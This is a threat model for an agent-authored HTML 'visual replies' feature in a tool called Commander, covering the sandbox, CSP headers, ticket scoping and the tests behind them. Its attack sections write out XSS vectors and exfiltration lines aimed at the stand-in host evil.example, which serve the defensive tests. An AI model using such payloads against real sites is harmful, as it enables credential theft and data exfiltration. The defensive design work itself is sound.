# Visual replies: threat model

A supervisor can attach an HTML page to a reply: a report with diagrams, screenshots or video. Commander shows the page inline, inside the conversation, and offers to open it in its own tab. Agent HTML is untrusted input. A model writes it, and a prompt injection can steer that model, so we assume the page is hostile.

This note covers the attack surface and the controls that hold the line. The normative Commander security rules live in the [security ADR](../../specs/2026-08-08-commander-security-architecture.md). This feature adds one route and one CSP directive to those rules and weakens nothing else.

## What the operator gets

1. The supervisor publishes a `.html` file with the `artifact` tool and attaches the artifact id to a reply with `coordination action=message attachment=<id>`. Both paths already exist.
2. Commander sees an attachment with `mime: text/html`. Below the file card it renders a frame, `<iframe sandbox="" referrerpolicy="no-referrer">`.
3. Commander asks the machine for a page ticket with a DPoP-authenticated `POST /v1/sessions/{session}/artifacts/{artifact}/page`. The machine answers with `/v1/pages/{ticket}/{artifact}`, and that URL becomes the frame's `src`.
4. Tapping the file card opens the same ticket URL in a new tab, never the raw blob URL. Both views get the same response headers.

The page can reference sibling artifacts by id, for example `<img src="art-1a2b3c4d">`. The URL is relative, so it resolves under the same ticket path. A sibling must also be attached to a reply in the same conversation. A page can also inline its images, SVG diagrams and fonts as `data:` URIs.

## Assets

| Asset | Where it lives | Who must never reach it |
| --- | --- | --- |
| DPoP device key (non-extractable) and opaque credential | Commander origin, IndexedDB | The page |
| Machine catalog and pairing state | Commander origin, IndexedDB and `localStorage` | The page |
| The operator's attention (clicks, keystrokes) | Commander's document | The page, apart from clicks inside its own frame |
| The operator's network identity (IP, read receipts) | Browser | Third-party hosts the page names |
| Other sessions' artifacts | Machine store | A ticket holder for a different session |

## Response headers on `/v1/pages/*`

The machine sets these headers on every page response, including its sub-assets. The response never passes through Commander's document.

```text
Content-Security-Policy: sandbox; default-src 'none'; img-src 'self' data:; media-src 'self' data:; style-src 'self' 'unsafe-inline'; font-src 'self' data:; base-uri 'none'; form-action 'none'; frame-ancestors <minting origin>
Content-Type: <the artifact's recorded type, never sniffed>
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Cache-Control: no-store
```

The machine's general `X-Frame-Options: DENY` is left off these responses only. `frame-ancestors` takes its place and names exactly one origin. The policy text lives in `cas-cli/src/hub/visual_page_csp.txt`. The Rust route and the browser journey's machine double both read that file, so they can't drift apart.

## Threats and controls

### T1: XSS, where the page runs script against Commander

*Attack.* `<script>`, `onerror=`, `javascript:` URLs, or SVG script try to read `document.cookie`, `localStorage` or IndexedDB, or to reach `parent.document`.

*Controls.*
- The CSP `sandbox` directive has no `allow-scripts`, so no script runs at all: inline, external, event handler or `javascript:` URL. The header applies in the frame and in a new tab alike, because it doesn't depend on Commander's `sandbox` attribute.
- `sandbox` without `allow-same-origin` gives the page an opaque origin. Even if script did run, it couldn't read the machine origin's storage, or Commander's storage when Commander is served from the machine. Commander stores no cookies by design.
- Commander adds a second, independent `sandbox=""` on the iframe. A misconfigured header still leaves the frame scriptless and opaque.
- Commander never parses, sanitizes or inserts the page markup. No agent HTML ever reaches Commander's document.

*Proof.* The journey loads a hostile page whose inline script, `onerror` handler and `javascript:` link would each leave a visible mark and try to post a message to Commander. The test asserts that no mark appears, no message arrives, and Commander's `localStorage` and IndexedDB are unchanged. A Rust test asserts the exact header on the page and on a sub-asset.

### T2: credential exfiltration, where the page sends data to another host

*Attack.* `<img src="https://evil.example/?k=…">`, CSS `background:url(https://evil…)`, `<link rel=prefetch>`, `<form action=https://evil…>`, `<meta http-equiv=refresh content="0;url=https://evil…">`, a font from a third-party host, or `<video src=https://evil…>`.

*Controls.*
- `default-src 'none'` covers everything that isn't named. `connect-src` falls back to `'none'`. Images, media, styles and fonts may only come from the machine origin (`'self'`) or `data:`. `form-action 'none'` blocks form posts, and the sandbox blocks form submission and automatic features as well.
- The page holds no secret worth exfiltrating. It's the agent's own content, and its opaque origin can't reach a DPoP key or credential.
- The ticket in the URL is a short-lived read capability. It is scoped to one session's artifacts on one machine and bound to one frame-ancestor origin. `Referrer-Policy: no-referrer` stops it from leaving in a `Referer` header, and `Cache-Control: no-store` keeps it out of shared caches.

*Proof.* The journey's hostile page names `https://evil.example` in an image, a stylesheet, a meta refresh, a form, a font and a video. The test records every request the browser makes and asserts that none of them targets `evil.example`.

*Residual.* A user who clicks a plain link inside the frame navigates that frame, and only that frame, to the link's target. In a page opened in its own tab, the same click navigates that tab. The navigation is a deliberate operator action, it is not automatic, and the target still can't reach Commander. Commander doesn't intercept the click.

### T3: clickjacking and top-window takeover

*Attack.* The page navigates `window.top` to a phishing copy of Commander, opens pop-ups, or draws a fake "Re-pair this machine" dialog over Commander. In the other direction, a third-party site frames a ticket URL, or frames Commander, to trick the operator into a click.

*Controls.*
- The sandbox omits `allow-top-navigation`, `allow-top-navigation-by-user-activation`, `allow-popups` and `allow-modals`. The page can't move `top`, open windows, or raise alerts.
- The frame is confined to its box in the thread. Its size is fixed by Commander's layout, `overflow` is clipped, and the page can't paint outside the frame.
- `frame-ancestors <minting origin>` means only the Commander origin that minted the ticket can embed the page. Any other site gets a blocked frame.
- Commander itself keeps `frame-ancestors 'none'` and `X-Frame-Options: DENY`. Its own CSP gains one directive, `frame-src 'self' https: http://127.0.0.1:*`, so that it can embed pages from a paired machine. The scheme allowance follows the same reasoning as `connect-src`: paired machines live on arbitrary hosts, and Commander only builds frame URLs from a paired machine's base URL and a ticket that machine issued.

*Proof.* The journey asserts that `top.location` and the window count are unchanged after the hostile page's top-navigation, `target=_top`, `target=_blank` and `window.open` attempts. A Rust test asserts `frame-ancestors` names exactly the minting origin and that Commander's CSP still carries `frame-ancestors 'none'`.

### T4: privilege confusion between sessions or machines

*Attack.* A page names another session's artifact id, or replays a ticket after the device is revoked.

*Controls.* The machine issues a ticket only after a DPoP `SessionRead` check on that exact session, and only for committed HTML attached to an operator reply in that session's thread. The ticket stores the session, the page artifact and the minting device's context. Every byte, page or sub-asset, goes through the shared session artifact path (`hub/artifact_proxy.rs`). That path rechecks the device's live permission on every fetch and serves only committed artifacts attached to that session's thread, within the 25 MiB cap, with Range support, and never forwards a Cloud bearer. A page is served only if it is `text/html`. A sub-asset is served only if it is `image/*`, `video/*`, `audio/*`, `font/*` or `text/css`. A ticket expires after 10 minutes and lives only in memory, so a machine restart drops it. Revoking the device closes its pages at the next fetch.

*Proof.* Rust tests cover the following. Minting without DPoP is refused. Minting for a non-HTML file, a missing file or another session's file gives 404. A second page, a sub-asset of a disallowed type, another session's file and an unknown ticket each give 404. A revoked device's page stops opening. A unit test covers expiry.

## Limits, stated plainly

- No page script, ever, in this version. That means no interactive charts. A diagram reaches the page as SVG, either inline or as a sibling artifact. Allowing scripts would need a separate review covering self-navigation exfiltration and a dedicated origin.
- Agent-published video and audio files can't upload to Cloud yet, because the upload type list excludes them; a separate follow-up owns that change. For now a page carries video inline as a `data:` URI, within the 25 MiB artifact cap.
- The hosted Commander origin (`hub.petrastella.io`) sets its CSP outside this repository. It needs the same `frame-src` amendment before inline pages render there. Until then, a hosted Commander still opens the page in a tab.
- The machine fetches pages server-side from the committed Cloud copy, through the same session artifact path that inline media uses. A page that never reached Cloud can't render, and the card says why, exactly as it does for any other file.
